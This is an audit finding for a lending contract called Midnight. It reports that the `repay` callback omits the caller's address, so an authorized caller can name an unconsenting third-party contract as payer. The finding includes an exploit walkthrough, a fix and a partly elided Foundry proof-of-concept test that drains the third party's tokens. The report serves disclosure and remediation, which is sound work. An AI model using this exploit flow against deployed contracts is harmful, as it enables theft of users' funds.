### Title
Caller Address Omitted from `onRepay` Callback Enables Arbitrary Payer Drain - (`File: src/Midnight.sol`)

### Summary
`Midnight.repay` sets `payer = callback` when a non-zero callback is supplied, then calls `IRepayCallback(callback).onRepay(...)` and finally pulls tokens from `payer` via `safeTransferFrom`. The `onRepay` interface omits the caller's address (unlike `onLiquidate` and `onFlashLoan` which both pass `caller`), so a callback contract has no protocol-provided way to verify who initiated the repayment. Any caller authorized by `onBehalf` can pass an arbitrary third-party contract as `callback`, causing that contract's tokens to be pulled without its consent.

### Finding Description

**Exact code path:**

`src/Midnight.sol` lines 502–521:

```solidity
function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
    external
{
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    // ...
    address payer = callback != address(0) ? callback : msg.sender;   // line 511
    // ...
    if (callback != address(0)) {
        require(
            IRepayCallback(callback).onRepay(id, market, units, onBehalf, data) == CALLBACK_SUCCESS,
            WrongRepayCallbackReturnValue()
        );
    }
    SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units); // line 520
}
```

`src/interfaces/ICallbacks.sol` line 21:
```solidity
function onRepay(bytes32 id, Market memory market, uint256 units, address onBehalf, bytes memory data) external returns (bytes32);
```

**Root cause — missing `caller` parameter in `onRepay`:**

Compare the three callback interfaces:
- `onFlashLoan(address caller, ...)` — passes caller ✓
- `onLiquidate(address caller, ...)` — passes caller ✓
- `onRepay(bytes32 id, Market memory market, uint256 units, address onBehalf, bytes memory data)` — **no caller** ✗

Because `onRepay` does not receive the address of the entity that called `repay`, a callback contract cannot distinguish a legitimate invocation (where it initiated the repayment) from a malicious one (where an attacker named it as `callback`). Checking `msg.sender == Midnight` is insufficient — it only confirms the call came from the protocol, not who triggered it.

**Attacker-controlled inputs:**
- `onBehalf` = victim (attacker is authorized by victim, e.g. via `EcrecoverAuthorizer.setIsAuthorized` or direct `setIsAuthorized`)
- `callback` = `thirdParty` (any contract with `onRepay` returning `CALLBACK_SUCCESS` and a Midnight token allowance)
- `units` = any amount ≤ victim's debt

**Exploit flow:**
1. Attacker obtains authorization from victim: `isAuthorized[victim][attacker] = true`.
2. `thirdParty` is a contract that has approved Midnight to spend its loan tokens (e.g. a repayment helper contract) and whose `onRepay` returns `CALLBACK_SUCCESS` without verifying the initiator.
3. Attacker calls `repay(market, units, onBehalf=victim, callback=thirdParty, data)`.
4. Authorization check passes (attacker is authorized by victim).
5. `payer = thirdParty`.
6. `thirdParty.onRepay(...)` is called — returns `CALLBACK_SUCCESS` (cannot check caller; caller is not passed).
7. `safeTransferFrom(loanToken, thirdParty, address(this), units)` executes, draining `thirdParty`.
8. Victim's debt is reduced; `thirdParty` bears the cost.

**Why existing checks fail:**
- The only guard is `isAuthorized[onBehalf][msg.sender]`, which validates the caller's right to act for `onBehalf`, not the right to designate an arbitrary third party as payer.
- There is no check `callback == msg.sender` or `isAuthorized[callback][msg.sender]`.
- The `onRepay` interface structurally prevents the callback from self-protecting via the caller address.

### Impact Explanation
`thirdParty`'s loan tokens are transferred to Midnight to repay `victim`'s debt. `thirdParty` receives nothing in return and did not consent to the payment. The invariant "callbacks, ERC20 transfers, multicall, or reentrancy cannot corrupt partial state" and "signatures, gates, ratifiers, callbacks, and approvals bind the right user/market/action/amount/deadline" are both violated: the callback is invoked against a party that never agreed to be the payer.

### Likelihood Explanation
**Preconditions:**
1. Attacker is authorized by victim — achievable via social engineering, a compromised key, or a broad authorization grant.
2. `thirdParty` has approved Midnight — realistic for any contract that participates in the protocol as a repayment helper, bundler, or position manager.
3. `thirdParty.onRepay` returns `CALLBACK_SUCCESS` without verifying the initiator — structurally forced by the missing `caller` parameter; any contract that cannot use out-of-band state (e.g. transient storage) to track self-initiated calls is vulnerable.

The attack is repeatable as long as the allowance and debt remain. It requires no oracle manipulation, no admin access, and no token misbehavior.

### Recommendation
Add the caller's address to `IRepayCallback.onRepay`, matching the pattern of `onLiquidate` and `onFlashLoan`:

```solidity
// src/interfaces/ICallbacks.sol
interface IRepayCallback {
    function onRepay(address caller, bytes32 id, Market memory market, uint256 units, address onBehalf, bytes memory data) external returns (bytes32);
}
```

And pass `msg.sender` at the call site in `Midnight.repay`:

```solidity
IRepayCallback(callback).onRepay(msg.sender, id, market, units, onBehalf, data)
```

This allows callback contracts to enforce `caller == address(this)` (or equivalent), preventing any third party from being named as payer without its consent.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IRepayCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

// Vulnerable callback: returns CALLBACK_SUCCESS unconditionally (cannot check caller)
contract VulnerableRepayCallback is IRepayCallback {
    function onRepay(bytes32, Market memory, uint256, address, bytes memory)
        external pure returns (bytes32)
    {
        return CALLBACK_SUCCESS; // no caller check possible — caller not passed
    }
}

contract RepayPayerConfusionTest is Test {
    Midnight midnight;
    MockERC20 loanToken;
    VulnerableRepayCallback thirdParty;
    address victim;
    address attacker;

    function setUp() public {
        midnight = new Midnight();
        loanToken = new MockERC20();
        thirdParty = new VulnerableRepayCallback();
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        // Give thirdParty tokens and approve Midnight
        loanToken.mint(address(thirdParty), 1000e18);
        vm.prank(address(thirdParty));
        loanToken.approve(address(midnight), type(uint256).max);

        // Victim authorizes attacker
        vm.prank(victim);
        midnight.setIsAuthorized(attacker, true, victim);

        // Setup: victim has debt (via take or direct state manipulation in test)
        // ... [market creation, victim borrows units] ...
    }

    function test_drainThirdPartyViaRepayCallback() public {
        uint256 units = 100e18;
        uint256 thirdPartyBalanceBefore = loanToken.balanceOf(address(thirdParty));

        vm.prank(attacker);
        midnight.repay(market, units, victim, address(thirdParty), "");

        uint256 thirdPartyBalanceAfter = loanToken.balanceOf(address(thirdParty));

        // Assert: thirdParty's balance decreased by units
        assertEq(thirdPartyBalanceBefore - thirdPartyBalanceAfter, units);
        // Assert: victim's debt decreased
        assertEq(midnight.debtOf(marketId, victim), 0);
    }
}
```

**Expected assertions:**
- `thirdParty` balance decreases by `units`.
- Victim's debt is reduced to zero.
- `thirdParty` received no collateral or compensation. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** src/Midnight.sol (L502-521)
```text
    function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);

        position[id][onBehalf].debt -= UtilsLib.toUint128(units);
        marketState[id].withdrawable += UtilsLib.toUint128(units);

        address payer = callback != address(0) ? callback : msg.sender;
        emit EventsLib.Repay(msg.sender, id, units, onBehalf, payer);

        if (callback != address(0)) {
            require(
                IRepayCallback(callback).onRepay(id, market, units, onBehalf, data) == CALLBACK_SUCCESS,
                WrongRepayCallbackReturnValue()
            );
        }
        SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units);
    }
```

**File:** src/interfaces/ICallbacks.sol (L16-26)
```text
interface ILiquidateCallback {
    function onLiquidate(address caller, bytes32 id, Market memory market, uint256 collateralIndex, uint256 seizedAssets, uint256 repaidUnits, address borrower, address receiver, bytes memory data, uint256 badDebt) external returns (bytes32);
}

interface IRepayCallback {
    function onRepay(bytes32 id, Market memory market, uint256 units, address onBehalf, bytes memory data) external returns (bytes32);
}

interface IFlashLoanCallback {
    function onFlashLoan(address caller, address[] memory tokens, uint256[] memory assets, bytes memory data) external returns (bytes32);
}
```
